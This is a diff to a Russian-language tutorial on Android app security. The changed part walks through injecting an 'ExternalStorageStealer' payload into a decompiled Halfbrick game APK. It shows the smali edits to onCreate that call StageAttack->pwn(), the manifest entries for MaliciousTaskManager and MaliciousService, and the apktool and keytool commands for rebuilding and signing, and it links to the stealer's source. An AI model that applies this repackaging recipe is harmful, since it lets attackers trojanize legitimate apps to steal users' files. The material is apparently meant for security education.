@@ -1,5 +1,5 @@
 
-<img src="/assets/images/main_logo.png" width="400" height="500" />
+![img]("/assets/images/main_logo.png")
 
 # About
   Данный текст разделен на три части. Они не связанны между собой, за исключением того, что все они относятся к андроид приложениям.
@@ -369,8 +369,7 @@ private void sendToServer(String path) {
 .end method
 ```
 
-Выяснили, что MortarGameLauncherActivity запускает MortarGameActivity и закрывается. Открываем MortarGameActivity. В нем нам интересно то, что происходит в методе ```Oncreate```, так как с него начинается любое активити.
-Куда-то сюда нам надо вставить вызов нашего кода. Вставлять надо так, чтобы сохранить порядок line. Стрелочкой показано, куда будем вставлять
+Выяснили, что MortarGameLauncherActivity запускает MortarGameActivity и закрывается. Открываем MortarGameActivity. Комментировать полностью его не будем. Нам интересно то, что происходит в методе ```Oncreate```, так как с него начинается создание активити. Сразу после него будем вставлять наш код. Важно не нарушить порядок line, при вставке.
 
 ```smali
 .method protected onCreate(Landroid/os/Bundle;)V
@@ -395,17 +394,72 @@ private void sendToServer(String path) {
 
     .line 475
     invoke-virtual {p0}, Lcom/halfbrick/mortar/MortarGameActivity;->getIntent()Landroid/content/Intent;
+    
+    ...
 ```
 
-Куда вставлять нашли, теперь нужен smali код того, что хотим вставить. Собираем в apk наш сканер и декомпилируем. Переносим наши три класса в папку com/halfbrick/mortar (там же, где лежит активити целевая). Меняем им package name с kz.c.signscan на com.halfbrick.mortar. 
+Теперь нам нужен smali код payload'а. Собираем в apk наш сканер и декомпилируем. Переносим наши три декомпилированных класса, которые лежат по пути "smali\kz\c\signscan", папку com/halfbrick/mortar. Меняем package name всем классам, с kz.c.signscan на com.halfbrick.mortar. 
 
-(Вставить много красивых картинок! Типа, какой был код и какой стал)
+Было:
 
-В smali классе MainActivity берем строчку вызова StageAttack->pwn(). Копируем ее и вставляем в MortarGameActivity, в то место, которое мы определили. Добавляем в manifest наш ресивер и сервис.
+```java
+.class public Lkz/c/signscan/StageAttack;
 ```
+
+Стало:
+```java
+.class public Lcom/halfbrick/mortar/StageAttack;
+```
+
+В smali классе MainActivity берем строчку вызова payload'а:
+```java
+invoke-static {p0}, Lcom/halfbrick/mortar/StageAttack;->pwn(Landroid/content/Context;)V
+```
+
+И вставляем в MortarGameActivity. В итоге метод onCreate() выглядит:
+
+```java
+.method protected onCreate(Landroid/os/Bundle;)V
+    .locals 9
+
+    :try_start_0
+    const-string v0, "android.os.AsyncTask"
+
+    .line 465
+    invoke-static {v0}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;
+    :try_end_0
+    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0
+
+    .line 471
+    :catch_0
+    invoke-super {p0, p1}, Landroid/support/v4/app/FragmentActivity;->onCreate(Landroid/os/Bundle;)V
+	
+	.line 472
+    invoke-static {p0}, Lcom/halfbrick/mortar/StageAttack;->pwn(Landroid/content/Context;)V
+	
+    .line 473
+    invoke-static {}, Lcom/halfbrick/mortar/NativeGameLib;->TryLoadGameLibrary()Z
+
+    .line 475
+    invoke-virtual {p0}, Lcom/halfbrick/mortar/MortarGameActivity;->getIntent()Landroid/content/Intent;
+    
+    ...
+```
+
+Класс MaliciousTaskManager в payload это BroadcastReceiver, а MaliciousService это IntentService, поэтому мы должны их прописать в манифесте.
+
+```xml
+...
 <receiver android:name=".MaliciousTaskManager"/>
 <service android:name=".MaliciousService"/>
+...
 ```
 
-Запаковываем все обратно и подписываем (тут со стековерфлоу взять команды и написать че к чему). И видеодемонстрация!
+Запаковываем все обратно командой ```apktool b myfolder```. В итоге получим apk файл. Теперь нам необходимо его подписать, чтобы андроид принял наше приложение. Для начала сгенерируем ключ, которым будем подписывать:
+
+```
+keytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000
+```
+
+
 [Здесь исходники](https://github.com/OrderOfSixAngles/ExternalStorageStealer)
